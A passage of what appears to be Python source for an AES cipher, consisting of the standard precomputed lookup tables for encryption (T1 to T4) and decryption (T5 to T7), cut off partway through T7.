0x7c3e3e42, 0x71b5b5c4, 0xcc6666aa, 0x904848d8, 0x06030305, 0xf7f6f601, 0x1c0e0e12, 0xc26161a3, 0x6a35355f, 0xae5757f9, 0x69b9b9d0, 0x17868691, 0x99c1c158, 0x3a1d1d27, 0x279e9eb9, 0xd9e1e138, 0xebf8f813, 0x2b9898b3, 0x22111133, 0xd26969bb, 0xa9d9d970, 0x078e8e89, 0x339494a7, 0x2d9b9bb6, 0x3c1e1e22, 0x15878792, 0xc9e9e920, 0x87cece49, 0xaa5555ff, 0x50282878, 0xa5dfdf7a, 0x038c8c8f, 0x59a1a1f8, 0x09898980, 0x1a0d0d17, 0x65bfbfda, 0xd7e6e631, 0x844242c6, 0xd06868b8, 0x824141c3, 0x299999b0, 0x5a2d2d77, 0x1e0f0f11, 0x7bb0b0cb, 0xa85454fc, 0x6dbbbbd6, 0x2c16163a ]
    T2 = [ 0xa5c66363, 0x84f87c7c, 0x99ee7777, 0x8df67b7b, 0x0dfff2f2, 0xbdd66b6b, 0xb1de6f6f, 0x5491c5c5, 0x50603030, 0x03020101, 0xa9ce6767, 0x7d562b2b, 0x19e7fefe, 0x62b5d7d7, 0xe64dabab, 0x9aec7676, 0x458fcaca, 0x9d1f8282, 0x4089c9c9, 0x87fa7d7d, 0x15effafa, 0xebb25959, 0xc98e4747, 0x0bfbf0f0, 0xec41adad, 0x67b3d4d4, 0xfd5fa2a2, 0xea45afaf, 0xbf239c9c, 0xf753a4a4, 0x96e47272, 0x5b9bc0c0, 0xc275b7b7, 0x1ce1fdfd, 0xae3d9393, 0x6a4c2626, 0x5a6c3636, 0x417e3f3f, 0x02f5f7f7, 0x4f83cccc, 0x5c683434, 0xf451a5a5, 0x34d1e5e5, 0x08f9f1f1, 0x93e27171, 0x73abd8d8, 0x53623131, 0x3f2a1515, 0x0c080404, 0x5295c7c7, 0x65462323, 0x5e9dc3c3, 0x28301818, 0xa1379696, 0x0f0a0505, 0xb52f9a9a, 0x090e0707, 0x36241212, 0x9b1b8080, 0x3ddfe2e2, 0x26cdebeb, 0x694e2727, 0xcd7fb2b2, 0x9fea7575, 0x1b120909, 0x9e1d8383, 0x74582c2c, 0x2e341a1a, 0x2d361b1b, 0xb2dc6e6e, 0xeeb45a5a, 0xfb5ba0a0, 0xf6a45252, 0x4d763b3b, 0x61b7d6d6, 0xce7db3b3, 0x7b522929, 0x3edde3e3, 0x715e2f2f, 0x97138484, 0xf5a65353, 0x68b9d1d1, 0x00000000, 0x2cc1eded, 0x60402020, 0x1fe3fcfc, 0xc879b1b1, 0xedb65b5b, 0xbed46a6a, 0x468dcbcb, 0xd967bebe, 0x4b723939, 0xde944a4a, 0xd4984c4c, 0xe8b05858, 0x4a85cfcf, 0x6bbbd0d0, 0x2ac5efef, 0xe54faaaa, 0x16edfbfb, 0xc5864343, 0xd79a4d4d, 0x55663333, 0x94118585, 0xcf8a4545, 0x10e9f9f9, 0x06040202, 0x81fe7f7f, 0xf0a05050, 0x44783c3c, 0xba259f9f, 0xe34ba8a8, 0xf3a25151, 0xfe5da3a3, 0xc0804040, 0x8a058f8f, 0xad3f9292, 0xbc219d9d, 0x48703838, 0x04f1f5f5, 0xdf63bcbc, 0xc177b6b6, 0x75afdada, 0x63422121, 0x30201010, 0x1ae5ffff, 0x0efdf3f3, 0x6dbfd2d2, 0x4c81cdcd, 0x14180c0c, 0x35261313, 0x2fc3ecec, 0xe1be5f5f, 0xa2359797, 0xcc884444, 0x392e1717, 0x5793c4c4, 0xf255a7a7, 0x82fc7e7e, 0x477a3d3d, 0xacc86464, 0xe7ba5d5d, 0x2b321919, 0x95e67373, 0xa0c06060, 0x98198181, 0xd19e4f4f, 0x7fa3dcdc, 0x66442222, 0x7e542a2a, 0xab3b9090, 0x830b8888, 0xca8c4646, 0x29c7eeee, 0xd36bb8b8, 0x3c281414, 0x79a7dede, 0xe2bc5e5e, 0x1d160b0b, 0x76addbdb, 0x3bdbe0e0, 0x56643232, 0x4e743a3a, 0x1e140a0a, 0xdb924949, 0x0a0c0606, 0x6c482424, 0xe4b85c5c, 0x5d9fc2c2, 0x6ebdd3d3, 0xef43acac, 0xa6c46262, 0xa8399191, 0xa4319595, 0x37d3e4e4, 0x8bf27979, 0x32d5e7e7, 0x438bc8c8, 0x596e3737, 0xb7da6d6d, 0x8c018d8d, 0x64b1d5d5, 0xd29c4e4e, 0xe049a9a9, 0xb4d86c6c, 0xfaac5656, 0x07f3f4f4, 0x25cfeaea, 0xafca6565, 0x8ef47a7a, 0xe947aeae, 0x18100808, 0xd56fbaba, 0x88f07878, 0x6f4a2525, 0x725c2e2e, 0x24381c1c, 0xf157a6a6, 0xc773b4b4, 0x5197c6c6, 0x23cbe8e8, 0x7ca1dddd, 0x9ce87474, 0x213e1f1f, 0xdd964b4b, 0xdc61bdbd, 0x860d8b8b, 0x850f8a8a, 0x90e07070, 0x427c3e3e, 0xc471b5b5, 0xaacc6666, 0xd8904848, 0x05060303, 0x01f7f6f6, 0x121c0e0e, 0xa3c26161, 0x5f6a3535, 0xf9ae5757, 0xd069b9b9, 0x91178686, 0x5899c1c1, 0x273a1d1d, 0xb9279e9e, 0x38d9e1e1, 0x13ebf8f8, 0xb32b9898, 0x33221111, 0xbbd26969, 0x70a9d9d9, 0x89078e8e, 0xa7339494, 0xb62d9b9b, 0x223c1e1e, 0x92158787, 0x20c9e9e9, 0x4987cece, 0xffaa5555, 0x78502828, 0x7aa5dfdf, 0x8f038c8c, 0xf859a1a1, 0x80098989, 0x171a0d0d, 0xda65bfbf, 0x31d7e6e6, 0xc6844242, 0xb8d06868, 0xc3824141, 0xb0299999, 0x775a2d2d, 0x111e0f0f, 0xcb7bb0b0, 0xfca85454, 0xd66dbbbb, 0x3a2c1616 ]
    T3 = [ 0x63a5c663, 0x7c84f87c, 0x7799ee77, 0x7b8df67b, 0xf20dfff2, 0x6bbdd66b, 0x6fb1de6f, 0xc55491c5, 0x30506030, 0x01030201, 0x67a9ce67, 0x2b7d562b, 0xfe19e7fe, 0xd762b5d7, 0xabe64dab, 0x769aec76, 0xca458fca, 0x829d1f82, 0xc94089c9, 0x7d87fa7d, 0xfa15effa, 0x59ebb259, 0x47c98e47, 0xf00bfbf0, 0xadec41ad, 0xd467b3d4, 0xa2fd5fa2, 0xafea45af, 0x9cbf239c, 0xa4f753a4, 0x7296e472, 0xc05b9bc0, 0xb7c275b7, 0xfd1ce1fd, 0x93ae3d93, 0x266a4c26, 0x365a6c36, 0x3f417e3f, 0xf702f5f7, 0xcc4f83cc, 0x345c6834, 0xa5f451a5, 0xe534d1e5, 0xf108f9f1, 0x7193e271, 0xd873abd8, 0x31536231, 0x153f2a15, 0x040c0804, 0xc75295c7, 0x23654623, 0xc35e9dc3, 0x18283018, 0x96a13796, 0x050f0a05, 0x9ab52f9a, 0x07090e07, 0x12362412, 0x809b1b80, 0xe23ddfe2, 0xeb26cdeb, 0x27694e27, 0xb2cd7fb2, 0x759fea75, 0x091b1209, 0x839e1d83, 0x2c74582c, 0x1a2e341a, 0x1b2d361b, 0x6eb2dc6e, 0x5aeeb45a, 0xa0fb5ba0, 0x52f6a452, 0x3b4d763b, 0xd661b7d6, 0xb3ce7db3, 0x297b5229, 0xe33edde3, 0x2f715e2f, 0x84971384, 0x53f5a653, 0xd168b9d1, 0x00000000, 0xed2cc1ed, 0x20604020, 0xfc1fe3fc, 0xb1c879b1, 0x5bedb65b, 0x6abed46a, 0xcb468dcb, 0xbed967be, 0x394b7239, 0x4ade944a, 0x4cd4984c, 0x58e8b058, 0xcf4a85cf, 0xd06bbbd0, 0xef2ac5ef, 0xaae54faa, 0xfb16edfb, 0x43c58643, 0x4dd79a4d, 0x33556633, 0x85941185, 0x45cf8a45, 0xf910e9f9, 0x02060402, 0x7f81fe7f, 0x50f0a050, 0x3c44783c, 0x9fba259f, 0xa8e34ba8, 0x51f3a251, 0xa3fe5da3, 0x40c08040, 0x8f8a058f, 0x92ad3f92, 0x9dbc219d, 0x38487038, 0xf504f1f5, 0xbcdf63bc, 0xb6c177b6, 0xda75afda, 0x21634221, 0x10302010, 0xff1ae5ff, 0xf30efdf3, 0xd26dbfd2, 0xcd4c81cd, 0x0c14180c, 0x13352613, 0xec2fc3ec, 0x5fe1be5f, 0x97a23597, 0x44cc8844, 0x17392e17, 0xc45793c4, 0xa7f255a7, 0x7e82fc7e, 0x3d477a3d, 0x64acc864, 0x5de7ba5d, 0x192b3219, 0x7395e673, 0x60a0c060, 0x81981981, 0x4fd19e4f, 0xdc7fa3dc, 0x22664422, 0x2a7e542a, 0x90ab3b90, 0x88830b88, 0x46ca8c46, 0xee29c7ee, 0xb8d36bb8, 0x143c2814, 0xde79a7de, 0x5ee2bc5e, 0x0b1d160b, 0xdb76addb, 0xe03bdbe0, 0x32566432, 0x3a4e743a, 0x0a1e140a, 0x49db9249, 0x060a0c06, 0x246c4824, 0x5ce4b85c, 0xc25d9fc2, 0xd36ebdd3, 0xacef43ac, 0x62a6c462, 0x91a83991, 0x95a43195, 0xe437d3e4, 0x798bf279, 0xe732d5e7, 0xc8438bc8, 0x37596e37, 0x6db7da6d, 0x8d8c018d, 0xd564b1d5, 0x4ed29c4e, 0xa9e049a9, 0x6cb4d86c, 0x56faac56, 0xf407f3f4, 0xea25cfea, 0x65afca65, 0x7a8ef47a, 0xaee947ae, 0x08181008, 0xbad56fba, 0x7888f078, 0x256f4a25, 0x2e725c2e, 0x1c24381c, 0xa6f157a6, 0xb4c773b4, 0xc65197c6, 0xe823cbe8, 0xdd7ca1dd, 0x749ce874, 0x1f213e1f, 0x4bdd964b, 0xbddc61bd, 0x8b860d8b, 0x8a850f8a, 0x7090e070, 0x3e427c3e, 0xb5c471b5, 0x66aacc66, 0x48d89048, 0x03050603, 0xf601f7f6, 0x0e121c0e, 0x61a3c261, 0x355f6a35, 0x57f9ae57, 0xb9d069b9, 0x86911786, 0xc15899c1, 0x1d273a1d, 0x9eb9279e, 0xe138d9e1, 0xf813ebf8, 0x98b32b98, 0x11332211, 0x69bbd269, 0xd970a9d9, 0x8e89078e, 0x94a73394, 0x9bb62d9b, 0x1e223c1e, 0x87921587, 0xe920c9e9, 0xce4987ce, 0x55ffaa55, 0x28785028, 0xdf7aa5df, 0x8c8f038c, 0xa1f859a1, 0x89800989, 0x0d171a0d, 0xbfda65bf, 0xe631d7e6, 0x42c68442, 0x68b8d068, 0x41c38241, 0x99b02999, 0x2d775a2d, 0x0f111e0f, 0xb0cb7bb0, 0x54fca854, 0xbbd66dbb, 0x163a2c16 ]
    T4 = [ 0x6363a5c6, 0x7c7c84f8, 0x777799ee, 0x7b7b8df6, 0xf2f20dff, 0x6b6bbdd6, 0x6f6fb1de, 0xc5c55491, 0x30305060, 0x01010302, 0x6767a9ce, 0x2b2b7d56, 0xfefe19e7, 0xd7d762b5, 0xababe64d, 0x76769aec, 0xcaca458f, 0x82829d1f, 0xc9c94089, 0x7d7d87fa, 0xfafa15ef, 0x5959ebb2, 0x4747c98e, 0xf0f00bfb, 0xadadec41, 0xd4d467b3, 0xa2a2fd5f, 0xafafea45, 0x9c9cbf23, 0xa4a4f753, 0x727296e4, 0xc0c05b9b, 0xb7b7c275, 0xfdfd1ce1, 0x9393ae3d, 0x26266a4c, 0x36365a6c, 0x3f3f417e, 0xf7f702f5, 0xcccc4f83, 0x34345c68, 0xa5a5f451, 0xe5e534d1, 0xf1f108f9, 0x717193e2, 0xd8d873ab, 0x31315362, 0x15153f2a, 0x04040c08, 0xc7c75295, 0x23236546, 0xc3c35e9d, 0x18182830, 0x9696a137, 0x05050f0a, 0x9a9ab52f, 0x0707090e, 0x12123624, 0x80809b1b, 0xe2e23ddf, 0xebeb26cd, 0x2727694e, 0xb2b2cd7f, 0x75759fea, 0x09091b12, 0x83839e1d, 0x2c2c7458, 0x1a1a2e34, 0x1b1b2d36, 0x6e6eb2dc, 0x5a5aeeb4, 0xa0a0fb5b, 0x5252f6a4, 0x3b3b4d76, 0xd6d661b7, 0xb3b3ce7d, 0x29297b52, 0xe3e33edd, 0x2f2f715e, 0x84849713, 0x5353f5a6, 0xd1d168b9, 0x00000000, 0xeded2cc1, 0x20206040, 0xfcfc1fe3, 0xb1b1c879, 0x5b5bedb6, 0x6a6abed4, 0xcbcb468d, 0xbebed967, 0x39394b72, 0x4a4ade94, 0x4c4cd498, 0x5858e8b0, 0xcfcf4a85, 0xd0d06bbb, 0xefef2ac5, 0xaaaae54f, 0xfbfb16ed, 0x4343c586, 0x4d4dd79a, 0x33335566, 0x85859411, 0x4545cf8a, 0xf9f910e9, 0x02020604, 0x7f7f81fe, 0x5050f0a0, 0x3c3c4478, 0x9f9fba25, 0xa8a8e34b, 0x5151f3a2, 0xa3a3fe5d, 0x4040c080, 0x8f8f8a05, 0x9292ad3f, 0x9d9dbc21, 0x38384870, 0xf5f504f1, 0xbcbcdf63, 0xb6b6c177, 0xdada75af, 0x21216342, 0x10103020, 0xffff1ae5, 0xf3f30efd, 0xd2d26dbf, 0xcdcd4c81, 0x0c0c1418, 0x13133526, 0xecec2fc3, 0x5f5fe1be, 0x9797a235, 0x4444cc88, 0x1717392e, 0xc4c45793, 0xa7a7f255, 0x7e7e82fc, 0x3d3d477a, 0x6464acc8, 0x5d5de7ba, 0x19192b32, 0x737395e6, 0x6060a0c0, 0x81819819, 0x4f4fd19e, 0xdcdc7fa3, 0x22226644, 0x2a2a7e54, 0x9090ab3b, 0x8888830b, 0x4646ca8c, 0xeeee29c7, 0xb8b8d36b, 0x14143c28, 0xdede79a7, 0x5e5ee2bc, 0x0b0b1d16, 0xdbdb76ad, 0xe0e03bdb, 0x32325664, 0x3a3a4e74, 0x0a0a1e14, 0x4949db92, 0x06060a0c, 0x24246c48, 0x5c5ce4b8, 0xc2c25d9f, 0xd3d36ebd, 0xacacef43, 0x6262a6c4, 0x9191a839, 0x9595a431, 0xe4e437d3, 0x79798bf2, 0xe7e732d5, 0xc8c8438b, 0x3737596e, 0x6d6db7da, 0x8d8d8c01, 0xd5d564b1, 0x4e4ed29c, 0xa9a9e049, 0x6c6cb4d8, 0x5656faac, 0xf4f407f3, 0xeaea25cf, 0x6565afca, 0x7a7a8ef4, 0xaeaee947, 0x08081810, 0xbabad56f, 0x787888f0, 0x25256f4a, 0x2e2e725c, 0x1c1c2438, 0xa6a6f157, 0xb4b4c773, 0xc6c65197, 0xe8e823cb, 0xdddd7ca1, 0x74749ce8, 0x1f1f213e, 0x4b4bdd96, 0xbdbddc61, 0x8b8b860d, 0x8a8a850f, 0x707090e0, 0x3e3e427c, 0xb5b5c471, 0x6666aacc, 0x4848d890, 0x03030506, 0xf6f601f7, 0x0e0e121c, 0x6161a3c2, 0x35355f6a, 0x5757f9ae, 0xb9b9d069, 0x86869117, 0xc1c15899, 0x1d1d273a, 0x9e9eb927, 0xe1e138d9, 0xf8f813eb, 0x9898b32b, 0x11113322, 0x6969bbd2, 0xd9d970a9, 0x8e8e8907, 0x9494a733, 0x9b9bb62d, 0x1e1e223c, 0x87879215, 0xe9e920c9, 0xcece4987, 0x5555ffaa, 0x28287850, 0xdfdf7aa5, 0x8c8c8f03, 0xa1a1f859, 0x89898009, 0x0d0d171a, 0xbfbfda65, 0xe6e631d7, 0x4242c684, 0x6868b8d0, 0x4141c382, 0x9999b029, 0x2d2d775a, 0x0f0f111e, 0xb0b0cb7b, 0x5454fca8, 0xbbbbd66d, 0x16163a2c ]

    # Transformations for decryption
    T5 = [ 0x51f4a750, 0x7e416553, 0x1a17a4c3, 0x3a275e96, 0x3bab6bcb, 0x1f9d45f1, 0xacfa58ab, 0x4be30393, 0x2030fa55, 0xad766df6, 0x88cc7691, 0xf5024c25, 0x4fe5d7fc, 0xc52acbd7, 0x26354480, 0xb562a38f, 0xdeb15a49, 0x25ba1b67, 0x45ea0e98, 0x5dfec0e1, 0xc32f7502, 0x814cf012, 0x8d4697a3, 0x6bd3f9c6, 0x038f5fe7, 0x15929c95, 0xbf6d7aeb, 0x955259da, 0xd4be832d, 0x587421d3, 0x49e06929, 0x8ec9c844, 0x75c2896a, 0xf48e7978, 0x99583e6b, 0x27b971dd, 0xbee14fb6, 0xf088ad17, 0xc920ac66, 0x7dce3ab4, 0x63df4a18, 0xe51a3182, 0x97513360, 0x62537f45, 0xb16477e0, 0xbb6bae84, 0xfe81a01c, 0xf9082b94, 0x70486858, 0x8f45fd19, 0x94de6c87, 0x527bf8b7, 0xab73d323, 0x724b02e2, 0xe31f8f57, 0x6655ab2a, 0xb2eb2807, 0x2fb5c203, 0x86c57b9a, 0xd33708a5, 0x302887f2, 0x23bfa5b2, 0x02036aba, 0xed16825c, 0x8acf1c2b, 0xa779b492, 0xf307f2f0, 0x4e69e2a1, 0x65daf4cd, 0x0605bed5, 0xd134621f, 0xc4a6fe8a, 0x342e539d, 0xa2f355a0, 0x058ae132, 0xa4f6eb75, 0x0b83ec39, 0x4060efaa, 0x5e719f06, 0xbd6e1051, 0x3e218af9, 0x96dd063d, 0xdd3e05ae, 0x4de6bd46, 0x91548db5, 0x71c45d05, 0x0406d46f, 0x605015ff, 0x1998fb24, 0xd6bde997, 0x894043cc, 0x67d99e77, 0xb0e842bd, 0x07898b88, 0xe7195b38, 0x79c8eedb, 0xa17c0a47, 0x7c420fe9, 0xf8841ec9, 0x00000000, 0x09808683, 0x322bed48, 0x1e1170ac, 0x6c5a724e, 0xfd0efffb, 0x0f853856, 0x3daed51e, 0x362d3927, 0x0a0fd964, 0x685ca621, 0x9b5b54d1, 0x24362e3a, 0x0c0a67b1, 0x9357e70f, 0xb4ee96d2, 0x1b9b919e, 0x80c0c54f, 0x61dc20a2, 0x5a774b69, 0x1c121a16, 0xe293ba0a, 0xc0a02ae5, 0x3c22e043, 0x121b171d, 0x0e090d0b, 0xf28bc7ad, 0x2db6a8b9, 0x141ea9c8, 0x57f11985, 0xaf75074c, 0xee99ddbb, 0xa37f60fd, 0xf701269f, 0x5c72f5bc, 0x44663bc5, 0x5bfb7e34, 0x8b432976, 0xcb23c6dc, 0xb6edfc68, 0xb8e4f163, 0xd731dcca, 0x42638510, 0x13972240, 0x84c61120, 0x854a247d, 0xd2bb3df8, 0xaef93211, 0xc729a16d, 0x1d9e2f4b, 0xdcb230f3, 0x0d8652ec, 0x77c1e3d0, 0x2bb3166c, 0xa970b999, 0x119448fa, 0x47e96422, 0xa8fc8cc4, 0xa0f03f1a, 0x567d2cd8, 0x223390ef, 0x87494ec7, 0xd938d1c1, 0x8ccaa2fe, 0x98d40b36, 0xa6f581cf, 0xa57ade28, 0xdab78e26, 0x3fadbfa4, 0x2c3a9de4, 0x5078920d, 0x6a5fcc9b, 0x547e4662, 0xf68d13c2, 0x90d8b8e8, 0x2e39f75e, 0x82c3aff5, 0x9f5d80be, 0x69d0937c, 0x6fd52da9, 0xcf2512b3, 0xc8ac993b, 0x10187da7, 0xe89c636e, 0xdb3bbb7b, 0xcd267809, 0x6e5918f4, 0xec9ab701, 0x834f9aa8, 0xe6956e65, 0xaaffe67e, 0x21bccf08, 0xef15e8e6, 0xbae79bd9, 0x4a6f36ce, 0xea9f09d4, 0x29b07cd6, 0x31a4b2af, 0x2a3f2331, 0xc6a59430, 0x35a266c0, 0x744ebc37, 0xfc82caa6, 0xe090d0b0, 0x33a7d815, 0xf104984a, 0x41ecdaf7, 0x7fcd500e, 0x1791f62f, 0x764dd68d, 0x43efb04d, 0xccaa4d54, 0xe49604df, 0x9ed1b5e3, 0x4c6a881b, 0xc12c1fb8, 0x4665517f, 0x9d5eea04, 0x018c355d, 0xfa877473, 0xfb0b412e, 0xb3671d5a, 0x92dbd252, 0xe9105633, 0x6dd64713, 0x9ad7618c, 0x37a10c7a, 0x59f8148e, 0xeb133c89, 0xcea927ee, 0xb761c935, 0xe11ce5ed, 0x7a47b13c, 0x9cd2df59, 0x55f2733f, 0x1814ce79, 0x73c737bf, 0x53f7cdea, 0x5ffdaa5b, 0xdf3d6f14, 0x7844db86, 0xcaaff381, 0xb968c43e, 0x3824342c, 0xc2a3405f, 0x161dc372, 0xbce2250c, 0x283c498b, 0xff0d9541, 0x39a80171, 0x080cb3de, 0xd8b4e49c, 0x6456c190, 0x7bcb8461, 0xd532b670, 0x486c5c74, 0xd0b85742 ]
    T6 = [ 0x5051f4a7, 0x537e4165, 0xc31a17a4, 0x963a275e, 0xcb3bab6b, 0xf11f9d45, 0xabacfa58, 0x934be303, 0x552030fa, 0xf6ad766d, 0x9188cc76, 0x25f5024c, 0xfc4fe5d7, 0xd7c52acb, 0x80263544, 0x8fb562a3, 0x49deb15a, 0x6725ba1b, 0x9845ea0e, 0xe15dfec0, 0x02c32f75, 0x12814cf0, 0xa38d4697, 0xc66bd3f9, 0xe7038f5f, 0x9515929c, 0xebbf6d7a, 0xda955259, 0x2dd4be83, 0xd3587421, 0x2949e069, 0x448ec9c8, 0x6a75c289, 0x78f48e79, 0x6b99583e, 0xdd27b971, 0xb6bee14f, 0x17f088ad, 0x66c920ac, 0xb47dce3a, 0x1863df4a, 0x82e51a31, 0x60975133, 0x4562537f, 0xe0b16477, 0x84bb6bae, 0x1cfe81a0, 0x94f9082b, 0x58704868, 0x198f45fd, 0x8794de6c, 0xb7527bf8, 0x23ab73d3, 0xe2724b02, 0x57e31f8f, 0x2a6655ab, 0x07b2eb28, 0x032fb5c2, 0x9a86c57b, 0xa5d33708, 0xf2302887, 0xb223bfa5, 0xba02036a, 0x5ced1682, 0x2b8acf1c, 0x92a779b4, 0xf0f307f2, 0xa14e69e2, 0xcd65daf4, 0xd50605be, 0x1fd13462, 0x8ac4a6fe, 0x9d342e53, 0xa0a2f355, 0x32058ae1, 0x75a4f6eb, 0x390b83ec, 0xaa4060ef, 0x065e719f, 0x51bd6e10, 0xf93e218a, 0x3d96dd06, 0xaedd3e05, 0x464de6bd, 0xb591548d, 0x0571c45d, 0x6f0406d4, 0xff605015, 0x241998fb, 0x97d6bde9, 0xcc894043, 0x7767d99e, 0xbdb0e842, 0x8807898b, 0x38e7195b, 0xdb79c8ee, 0x47a17c0a, 0xe97c420f, 0xc9f8841e, 0x00000000, 0x83098086, 0x48322bed, 0xac1e1170, 0x4e6c5a72, 0xfbfd0eff, 0x560f8538, 0x1e3daed5, 0x27362d39, 0x640a0fd9, 0x21685ca6, 0xd19b5b54, 0x3a24362e, 0xb10c0a67, 0x0f9357e7, 0xd2b4ee96, 0x9e1b9b91, 0x4f80c0c5, 0xa261dc20, 0x695a774b, 0x161c121a, 0x0ae293ba, 0xe5c0a02a, 0x433c22e0, 0x1d121b17, 0x0b0e090d, 0xadf28bc7, 0xb92db6a8, 0xc8141ea9, 0x8557f119, 0x4caf7507, 0xbbee99dd, 0xfda37f60, 0x9ff70126, 0xbc5c72f5, 0xc544663b, 0x345bfb7e, 0x768b4329, 0xdccb23c6, 0x68b6edfc, 0x63b8e4f1, 0xcad731dc, 0x10426385, 0x40139722, 0x2084c611, 0x7d854a24, 0xf8d2bb3d, 0x11aef932, 0x6dc729a1, 0x4b1d9e2f, 0xf3dcb230, 0xec0d8652, 0xd077c1e3, 0x6c2bb316, 0x99a970b9, 0xfa119448, 0x2247e964, 0xc4a8fc8c, 0x1aa0f03f, 0xd8567d2c, 0xef223390, 0xc787494e, 0xc1d938d1, 0xfe8ccaa2, 0x3698d40b, 0xcfa6f581, 0x28a57ade, 0x26dab78e, 0xa43fadbf, 0xe42c3a9d, 0x0d507892, 0x9b6a5fcc, 0x62547e46, 0xc2f68d13, 0xe890d8b8, 0x5e2e39f7, 0xf582c3af, 0xbe9f5d80, 0x7c69d093, 0xa96fd52d, 0xb3cf2512, 0x3bc8ac99, 0xa710187d, 0x6ee89c63, 0x7bdb3bbb, 0x09cd2678, 0xf46e5918, 0x01ec9ab7, 0xa8834f9a, 0x65e6956e, 0x7eaaffe6, 0x0821bccf, 0xe6ef15e8, 0xd9bae79b, 0xce4a6f36, 0xd4ea9f09, 0xd629b07c, 0xaf31a4b2, 0x312a3f23, 0x30c6a594, 0xc035a266, 0x37744ebc, 0xa6fc82ca, 0xb0e090d0, 0x1533a7d8, 0x4af10498, 0xf741ecda, 0x0e7fcd50, 0x2f1791f6, 0x8d764dd6, 0x4d43efb0, 0x54ccaa4d, 0xdfe49604, 0xe39ed1b5, 0x1b4c6a88, 0xb8c12c1f, 0x7f466551, 0x049d5eea, 0x5d018c35, 0x73fa8774, 0x2efb0b41, 0x5ab3671d, 0x5292dbd2, 0x33e91056, 0x136dd647, 0x8c9ad761, 0x7a37a10c, 0x8e59f814, 0x89eb133c, 0xeecea927, 0x35b761c9, 0xede11ce5, 0x3c7a47b1, 0x599cd2df, 0x3f55f273, 0x791814ce, 0xbf73c737, 0xea53f7cd, 0x5b5ffdaa, 0x14df3d6f, 0x867844db, 0x81caaff3, 0x3eb968c4, 0x2c382434, 0x5fc2a340, 0x72161dc3, 0x0cbce225, 0x8b283c49, 0x41ff0d95, 0x7139a801, 0xde080cb3, 0x9cd8b4e4, 0x906456c1, 0x617bcb84, 0x70d532b6, 0x74486c5c, 0x42d0b857 ]
    T7 = [ 0xa75051f4, 0x65537e41, 0xa4c31a17, 0x5e963a27, 0x6bcb3bab, 0x45f11f9d, 0x58abacfa, 0x03934be3, 0xfa552030, 0x6df6ad76, 0x769188cc, 0x4c25f502, 0xd7fc4fe5, 0xcbd7c52a, 0x44802635, 0xa38fb562, 0x5a49deb1, 0x1b6725ba, 0x0e9845ea, 0xc0e15dfe, 0x7502c32f, 0xf012814c, 0x97a38d46, 0xf9c66bd3, 0x5fe7038f, 0x9c951592, 0x7aebbf6d, 0x59da9552, 0x832dd4be, 0x21d35874, 0x692949e0, 0xc8448ec9, 0x896a75c2, 0x7978f48e, 0x3e6b9958, 0x71dd27b9, 0x4fb6bee1, 0xad17f088, 0xac66c920, 0x3ab47dce, 0x4a1863df, 0x3182e51a, 0x33609751, 0x7f456253, 0x77e0b164, 0xae84bb6b, 0xa01cfe81, 0x2b94f908, 0x68587048, 0xfd198f45, 0x6c8794de, 0xf8b7527b, 0xd323ab73, 0x02e2724b, 0x8f57e31f, 0xab2a6655, 0x2807b2eb, 0xc2032fb5, 0x7b9a86c5, 0x08a5d337, 0x87f23028, 0xa5b223bf, 0x6aba0203, 0x825ced16, 0x1c2b8acf, 0xb492a779, 0xf2f0f307, 0xe2a14e69, 0xf4cd65da, 0xbed50605, 0x621fd134, 0xfe8ac4a6, 0x539d342e, 0x55a0a2f3, 0xe132058a, 0xeb75a4f6, 0xec390b83, 0xefaa4060, 0x9f065e71, 0x1051bd6e, 0x8af93e21, 0x063d96dd, 0x05aedd3e, 0xbd464de6, 0x8db59154, 0x5d0571c4, 0xd46f0406, 0x15ff6050, 0xfb241998, 0xe997d6bd, 0x43cc8940, 0x9e7767d9, 0x42bdb0e8, 0x8b880789, 0x5b38e719, 0xeedb79c8, 0x0a47a17c, 0x0fe97c42, 0x1ec9f884, 0x00000000, 0x86830980, 0xed48322b, 0x70ac1e11, 0x724e6c5a, 0xfffbfd0e, 0x38560f85, 0xd51e3dae, 0x3927362d, 0xd9640a0f, 0xa621685c, 0x54d19b5b, 0x2e3a2436, 0x67b10c0a, 0xe70f9357, 0x96d2b4ee, 0x919e1b9b, 0xc54f80c0, 0x20a261dc, 0x4b695a77, 0x1a161c12, 0xba0ae293, 0x2ae5c0a0, 0xe0433c22, 0x171d121b, 0x0d0b0e09, 0xc7adf28b, 0xa8b92db6, 0xa9c8141e, 0x198557f1, 0x074caf75, 0xddbbee99, 0x60fda37f, 0x269ff701, 0xf5bc5c72, 0x3bc54466, 0x7e345bfb, 0x29768b43, 0xc6dccb23, 0xfc68b6ed, 0xf163b8e4, 0xdccad731, 0x85104263, 0x22401397, 0x112084c6, 0x247d854a, 0x3df8d2bb, 0x3211aef9, 0xa16dc729, 0x2f4b1d9e, 0x30f3dcb2, 0x52ec0d86, 0xe3d077c1, 0x166c2bb3, 0xb999a970, 0x48fa1194, 0x642247e9, 0x8cc4a8fc, 0x3f1aa0f0, 0x2cd8567d, 0x90ef2233, 0x4ec78749, 0xd1c1d938, 0xa2fe8cca, 0x0b3698d4, 0x81cfa6f5, 0xde28a57a, 0x8e26dab7, 0xbfa43fad, 0x9de42c3a, 0x920d5078, 0xcc9b6a5f, 0x4662547e, 0x13c2f68d, 0xb8e890d8, 0xf75e2e39, 0xaff582c3, 0x80be9f5d, 0x937c69d0, 0x2da96fd5, 0x12b3cf25, 0x993bc8ac, 0x7da71018, 0x636ee89c, 0xbb7bdb3b, 0x7809cd26, 0x18f46e59, 0xb701ec9a, 0x9aa8834f, 0x6e65e695, 0xe67eaaff, 0xcf0821bc, 0xe8e6ef15, 0x9bd9bae7, 0x36ce4a6f, 0x09d4ea9f, 0x7cd629b0, 0xb2af31a4, 0x23312a3f, 0x9430c6a5, 0x66c035a2, 0xbc37744e, 0xcaa6fc82, 0xd0b0e090, 0xd81533a7, 0x984af104, 0xdaf741ec, 0x500e7fcd, 0xf62f1791, 0xd68d764d, 0xb04d43ef, 0x4d54ccaa, 0x04dfe496, 0xb5e39ed1, 0x881b4c6a, 0x1fb8c12c, 0x517f4665, 0xea049d5e, 0x355d018c, 0x7473fa87, 0x412efb0b, 0x1d5ab367, 0xd25292db, 0x5633e910, 0x47136dd6, 0x618c9ad7, 0x0c7a37a1, 0x148e59f8, 0x3c89eb13, 0x27eecea9, 0xc935b761, 0xe5ede11c, 0xb13c7a47, 0xdf599cd2, 0x733f55f2, 0xce791814, 0x37bf73c7, 0xcdea53f7, 0xaa5b5ffd, 0x6f14df3d, 0xdb867844, 0xf381caaf, 0xc43eb968, 0x342c3824, 0x405fc2a3, 0xc372161d, 0x250cbce2, 0x498b283c, 0x9541ff0d, 0x017139a8, 0xb3de080c, 